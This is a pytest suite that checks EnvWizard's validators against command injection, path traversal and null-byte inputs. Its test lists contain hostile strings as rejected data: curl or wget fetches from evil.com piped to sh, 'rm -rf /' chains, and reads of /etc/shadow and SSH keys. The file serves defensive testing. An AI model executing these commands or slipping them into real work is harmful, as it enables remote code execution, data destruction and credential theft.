"""Comprehensive security tests for EnvWizard.

This test suite validates all security fixes applied to address:
- SEC-001: Command Injection in Package Installation (CVSS 7.8)
- SEC-002: Command Injection via Python Version (CVSS 7.5)
- SEC-003: Path Traversal in Project Detection (CVSS 7.3)
"""

import pytest
import re
from pathlib import Path
from envwizard.venv import VirtualEnvManager, _validate_package_name, _validate_python_version
from envwizard.core import EnvWizard, _validate_project_path


class TestCommandInjectionPrevention:
    """Test command injection vulnerability fixes (SEC-001, SEC-002)."""

    def test_validate_package_name_valid(self):
        """Test that valid package names pass validation."""
        valid_packages = [
            "django",
            "numpy",
            "flask-restful",
            "requests",
            "beautifulsoup4",
            "django-rest-framework",
            "my_package",
            "package.name",
            "numpy>=1.20.0",
            "requests==2.28.0",
            "flask>=2.0,<3.0",
            "package[extras]",
            "package[security,tests]",
            "pkg~=1.0",
            "pkg!=1.5",
        ]

        for package in valid_packages:
            assert _validate_package_name(package) is True, f"Valid package rejected: {package}"

    def test_validate_package_name_command_injection(self):
        """Test that command injection attempts are blocked (SEC-001)."""
        malicious_packages = [
            "pkg; rm -rf /",
            "pkg && cat /etc/passwd",
            "pkg | whoami",
            "pkg & malicious_command",
            "pkg; cat /etc/shadow",
            "pkg`whoami`",
            "pkg$(whoami)",
            "pkg; curl evil.com | sh",
            "pkg\nmalicious",
            "pkg\rmalicious",
            "; rm -rf /",
            "../../bin/sh",
            "pkg; python -c 'import os; os.system(\"rm -rf /\")'",
            "pkg && python malicious.py",
            "pkg; wget http://evil.com/backdoor.sh",
        ]

        for package in malicious_packages:
            assert _validate_package_name(package) is False, f"Malicious package accepted: {package}"

    def test_validate_package_name_special_chars(self):
        """Test that packages with invalid special characters are rejected."""
        invalid_packages = [
            "pkg;",
            "pkg&",
            "pkg|",
            "pkg`",
            "pkg$",
            "pkg(",
            "pkg)",
            "pkg{",
            "pkg}",
            "pkg'",
            'pkg"',
            "pkg\\",
            "pkg/",
            "pkg\nmalicious",  # Newline with actual content after
            "",  # empty
            "   ",  # only spaces
        ]

        for package in invalid_packages:
            result = _validate_package_name(package)
            assert result is False, f"Package with special chars accepted: {package}"

    def test_validate_python_version_valid(self):
        """Test that valid Python versions pass validation."""
        valid_versions = [
            "3.9",
            "3.10",
            "3.11",
            "3.12",
            "3.11.2",
            "3.9.0",
            "2.7",
            "3",  # Major version only
            "3.11.5",
        ]

        for version in valid_versions:
            assert _validate_python_version(version) is True, f"Valid version rejected: {version}"

    def test_validate_python_version_command_injection(self):
        """Test that command injection via version is blocked (SEC-002)."""
        malicious_versions = [
            "3.9; cat /etc/passwd",
            "3.11 && whoami",
            "3.10 | malicious",
            "3.9; rm -rf /",
            "../../bin/sh",
            "3.9`whoami`",
            "3.10$(whoami)",
            "3.11; curl evil.com | sh",
            "3.9\nmalicious",
            "; malicious_command",
            "3.9 && python malicious.py",
        ]

        for version in malicious_versions:
            assert _validate_python_version(version) is False, f"Malicious version accepted: {version}"

    def test_validate_python_version_invalid_format(self):
        """Test that invalid version formats are rejected."""
        invalid_versions = [
            "abc",
            "x.y.z",
            "3.9.x",
            "3.9.0.0",
            "3.9-alpha",
            "3.9.0rc1",
            "3.9.0b2",
            "python3.9",
            "v3.9",
            "3.9.0-",
            ".3.9",
            "3.",
            "",
            "   ",
            "3.9 ",  # trailing space
            " 3.9",  # leading space
        ]

        for version in invalid_versions:
            result = _validate_python_version(version)
            # Most should be rejected, but some might pass after strip()
            if version.strip() and re.match(r'^\d+(\.\d+)?(\.\d+)?$', version.strip()):
                # If it matches the pattern after stripping, it's OK
                pass
            else:
                assert result is False, f"Invalid version accepted: {version}"

    def test_install_package_injection_attempt(self, temp_project_dir):
        """Test that install_package rejects command injection (SEC-001)."""
        manager = VirtualEnvManager(temp_project_dir)
        success, _, venv_path = manager.create_venv("test_venv")
        assert success is True

        # Try to inject commands through package name
        malicious_packages = [
            "pkg; rm -rf /",
            "pkg && cat /etc/passwd",
            "pkg | whoami",
        ]

        for malicious_pkg in malicious_packages:
            success, message = manager.install_package(venv_path, malicious_pkg)
            assert success is False, f"Command injection not prevented for: {malicious_pkg}"
            assert "Invalid package name" in message, f"Wrong error message for: {malicious_pkg}"

    def test_create_venv_version_injection_attempt(self, temp_project_dir):
        """Test that create_venv rejects version injection (SEC-002)."""
        manager = VirtualEnvManager(temp_project_dir)

        malicious_versions = [
            "3.9; cat /etc/passwd",
            "3.11 && whoami",
            "3.10 | malicious",
        ]

        for malicious_version in malicious_versions:
            success, message, _ = manager.create_venv("test_venv2", python_version=malicious_version)
            assert success is False, f"Version injection not prevented for: {malicious_version}"
            assert "Invalid Python version" in message, f"Wrong error message for: {malicious_version}"


class TestPathTraversalPrevention:
    """Test path traversal vulnerability fixes (SEC-003)."""

    def test_validate_project_path_valid(self, temp_project_dir):
        """Test that valid paths are accepted."""
        valid_paths = [
            temp_project_dir,
            temp_project_dir / "subdir",
            Path.cwd(),
            Path.home() / "projects",
        ]

        for path in valid_paths:
            try:
                resolved = _validate_project_path(path)
                assert resolved.is_absolute()
            except ValueError:
                # It's OK if the path doesn't exist, as long as it's not forbidden
                pass

    def test_validate_project_path_system_directories(self):
        """Test that system directories are blocked (SEC-003)."""
        forbidden_paths = [
            Path("/etc"),
            Path("/etc/passwd"),
            Path("/etc/../etc/shadow"),
            Path("/sys"),
            Path("/sys/kernel"),
            Path("/proc"),
            Path("/proc/self"),
            Path("/root"),
            Path("/root/.ssh"),
        ]

        for forbidden_path in forbidden_paths:
            with pytest.raises(ValueError) as exc_info:
                _validate_project_path(forbidden_path)
            assert "not allowed" in str(exc_info.value).lower(), f"Wrong error for: {forbidden_path}"

    def test_validate_project_path_traversal_attempts(self):
        """Test that path traversal attempts are blocked."""
        # These should be blocked if they resolve to forbidden paths
        traversal_attempts = [
            "/tmp/../etc/passwd",
            "/home/../etc/shadow",
            "/var/../sys/kernel",
            "/opt/../proc/self",
        ]

        for attempt in traversal_attempts:
            path = Path(attempt)
            try:
                resolved = _validate_project_path(path)
                # If it resolved, make sure it's not in a forbidden directory
                forbidden = [Path("/etc"), Path("/sys"), Path("/proc"), Path("/root")]
                for forbidden_path in forbidden:
                    try:
                        resolved.relative_to(forbidden_path)
                        pytest.fail(f"Traversal to {forbidden_path} not prevented for: {attempt}")
                    except ValueError:
                        pass  # Not relative - this is OK
            except ValueError as e:
                # Expected to be blocked
                assert "not allowed" in str(e).lower() or "Invalid" in str(e)

    def test_validate_project_path_null_byte(self):
        """Test that null byte injection is blocked."""
        with pytest.raises(ValueError) as exc_info:
            _validate_project_path(Path("/tmp/test\x00/malicious"))
        assert "null" in str(exc_info.value).lower()

    def test_envwizard_init_path_validation(self, temp_project_dir):
        """Test that EnvWizard.__init__ validates paths."""
        # Valid path should work
        wizard = EnvWizard(temp_project_dir)
        assert wizard.project_path.is_absolute()

        # Forbidden path should be blocked
        with pytest.raises(ValueError):
            EnvWizard(Path("/etc/passwd"))

    def test_envwizard_init_traversal_attempt(self, temp_project_dir):
        """Test that EnvWizard blocks traversal to system dirs."""
        forbidden_attempts = [
            Path("/etc"),
            Path("/sys"),
            Path("/proc"),
            Path("/root"),
        ]

        for forbidden in forbidden_attempts:
            with pytest.raises(ValueError) as exc_info:
                EnvWizard(forbidden)
            assert "not allowed" in str(exc_info.value).lower() or "Invalid" in str(exc_info.value)


class TestInputValidationEdgeCases:
    """Test edge cases and additional input validation."""

    def test_package_name_regex_pattern(self):
        """Test the regex pattern against edge cases."""
        pattern = r'^[a-zA-Z0-9][a-zA-Z0-9._\[\]>=<~!-]*$'

        # Should match
        valid = [
            "a",
            "A",
            "0pkg",
            "pkg-name",
            "pkg_name",
            "pkg.name",
            "pkg[extra]",
            "pkg>=1.0",
        ]
        for pkg in valid:
            assert re.match(pattern, pkg), f"Regex didn't match valid package: {pkg}"

        # Should not match
        invalid = [
            ";pkg",  # Starts with invalid char
            "pkg;",
            "pkg&cmd",
            "pkg|cmd",
            "pkg`cmd`",
            "pkg$var",
        ]
        for pkg in invalid:
            assert not re.match(pattern, pkg), f"Regex matched invalid package: {pkg}"

    def test_version_regex_pattern(self):
        """Test the version regex pattern against edge cases."""
        pattern = r'^\d+(\.\d+)?(\.\d+)?$'

        # Should match
        valid = ["3", "3.9", "3.9.0", "3.11", "3.11.5"]
        for ver in valid:
            assert re.match(pattern, ver), f"Regex didn't match valid version: {ver}"

        # Should not match
        invalid = [
            "3.9;",
            "3.9.0.0",
            "v3.9",
            "3.9a",
            "3.9-",
            ";3.9",
        ]
        for ver in invalid:
            assert not re.match(pattern, ver), f"Regex matched invalid version: {ver}"

    def test_whitespace_handling(self):
        """Test that whitespace is properly handled."""
        # Package names with whitespace
        assert _validate_package_name("  django  ") is True  # Should be stripped
        assert _validate_package_name("django requests") is False  # Space in middle

        # Versions with whitespace
        assert _validate_python_version("  3.9  ") is True  # Should be stripped
        assert _validate_python_version("3.9 ") is True  # Trailing space
        assert _validate_python_version(" 3.9") is True  # Leading space

    def test_empty_input_handling(self):
        """Test that empty inputs are rejected."""
        assert _validate_package_name("") is False
        assert _validate_package_name("   ") is False
        assert _validate_python_version("") is False
        assert _validate_python_version("   ") is False

    def test_unicode_handling(self):
        """Test handling of unicode characters."""
        # Unicode in package names (should be rejected)
        assert _validate_package_name("pkg\u0000name") is False  # Null byte
        assert _validate_package_name("pkg\u202ename") is False  # Right-to-left override

        # Most unicode should be rejected by the alphanumeric requirement
        assert _validate_package_name("pkg\u4e2dname") is False  # Chinese character


class TestSecurityLogging:
    """Test that security events are properly logged."""

    def test_invalid_package_logged(self, temp_project_dir, caplog):
        """Test that invalid package attempts are logged."""
        import logging
        caplog.set_level(logging.WARNING)

        manager = VirtualEnvManager(temp_project_dir)
        success, _, venv_path = manager.create_venv("test_venv")

        manager.install_package(venv_path, "pkg; rm -rf /")

        # Check that the rejection was logged
        assert any("Invalid package name rejected" in record.message for record in caplog.records)

    def test_invalid_version_logged(self, temp_project_dir, caplog):
        """Test that invalid version attempts are logged."""
        import logging
        caplog.set_level(logging.WARNING)

        manager = VirtualEnvManager(temp_project_dir)
        manager.create_venv("test_venv", python_version="3.9; malicious")

        # Check that the rejection was logged
        assert any("Invalid Python version" in record.message for record in caplog.records)


class TestDotEnvSecurityFixes:
    """Test .env generation security fixes (SEC-005, SEC-011)."""

    def test_dotenv_path_traversal_prevention(self, temp_project_dir):
        """Test that path traversal in output_file is blocked (SEC-005)."""
        from envwizard.generators.dotenv import DotEnvGenerator

        generator = DotEnvGenerator(temp_project_dir)

        # Test path traversal attempts
        malicious_paths = [
            "../.env",
            "../../etc/passwd",
            "/etc/passwd",
            "/tmp/malicious.env",
            "./../.env",
            "subdir/../../../etc/passwd",
        ]

        for malicious_path in malicious_paths:
            success, message = generator.generate_dotenv([], output_file=malicious_path)
            assert success is False, f"Path traversal not prevented: {malicious_path}"
            assert ("Invalid" in message or "escapes" in message), f"Wrong error for: {malicious_path}"

    def test_dotenv_valid_filenames(self, temp_project_dir):
        """Test that valid filenames work correctly."""
        from envwizard.generators.dotenv import DotEnvGenerator

        generator = DotEnvGenerator(temp_project_dir)

        valid_filenames = [
            ".env",
            ".env.local",
            ".env.production",
            "config.env",
        ]

        for filename in valid_filenames:
            # Clean up if exists
            (temp_project_dir / filename).unlink(missing_ok=True)

            success, message = generator.generate_dotenv([], output_file=filename)
            assert success is True, f"Valid filename rejected: {filename}"

    def test_dotenv_file_permissions(self, temp_project_dir):
        """Test that .env files are created with secure permissions (SEC-011)."""
        import platform
        from envwizard.generators.dotenv import DotEnvGenerator

        # Skip on Windows (doesn't have Unix permissions)
        if platform.system() == "Windows":
            import pytest
            pytest.skip("File permissions not applicable on Windows")

        generator = DotEnvGenerator(temp_project_dir)
        env_file = temp_project_dir / ".env"

        # Clean up if exists
        env_file.unlink(missing_ok=True)

        # Generate .env file
        success, _ = generator.generate_dotenv([])
        assert success is True

        # Check permissions (should be 0600 = owner read/write only)
        import stat
        file_mode = env_file.stat().st_mode
        permissions = stat.filemode(file_mode)

        # Should be -rw------- (owner read/write only)
        assert oct(stat.S_IMODE(file_mode)) == '0o600', f"Insecure permissions: {permissions}"

    def test_dotenv_null_byte_rejection(self, temp_project_dir):
        """Test that null bytes in filename are rejected."""
        from envwizard.generators.dotenv import DotEnvGenerator

        generator = DotEnvGenerator(temp_project_dir)

        success, message = generator.generate_dotenv([], output_file=".env\x00malicious")
        assert success is False
        assert "Invalid" in message


class TestRealWorldAttackScenarios:
    """Test realistic attack scenarios."""

    def test_chained_command_injection(self, temp_project_dir):
        """Test complex chained command injection attempts."""
        manager = VirtualEnvManager(temp_project_dir)
        success, _, venv_path = manager.create_venv("test_venv")

        attack_chains = [
            "pkg && curl http://evil.com/backdoor | sh",
            "pkg; python -c 'import os; os.system(\"rm -rf /\")'",
            "pkg | tee /tmp/output && cat /etc/passwd",
            "pkg & sleep 10 && malicious_command",
        ]

        for attack in attack_chains:
            success, message = manager.install_package(venv_path, attack)
            assert success is False
            assert "Invalid package name" in message

    def test_environment_variable_injection(self, temp_project_dir):
        """Test injection through environment variables."""
        manager = VirtualEnvManager(temp_project_dir)
        success, _, venv_path = manager.create_venv("test_venv")

        attacks = [
            "pkg$PATH",
            "pkg${PATH}",
            "pkg$(echo malicious)",
            "pkg$((2+2))",
        ]

        for attack in attacks:
            success, message = manager.install_package(venv_path, attack)
            assert success is False
            assert "Invalid package name" in message

    def test_path_traversal_to_sensitive_files(self):
        """Test traversal attempts to sensitive files."""
        sensitive_targets = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/root/.ssh/authorized_keys",
            "/proc/self/environ",
            "/sys/kernel/debug",
        ]

        for target in sensitive_targets:
            with pytest.raises(ValueError):
                _validate_project_path(Path(target))

    def test_symlink_traversal(self, temp_project_dir):
        """Test that symlinks to forbidden paths are blocked."""
        # Create a symlink to /etc
        symlink_path = temp_project_dir / "symlink_to_etc"
        try:
            symlink_path.symlink_to("/etc")

            # This should be blocked because it resolves to /etc
            with pytest.raises(ValueError):
                _validate_project_path(symlink_path)
        except (OSError, NotImplementedError):
            # Skip if symlinks not supported (Windows without admin)
            pytest.skip("Symlinks not supported on this system")
        finally:
            if symlink_path.exists():
                symlink_path.unlink()
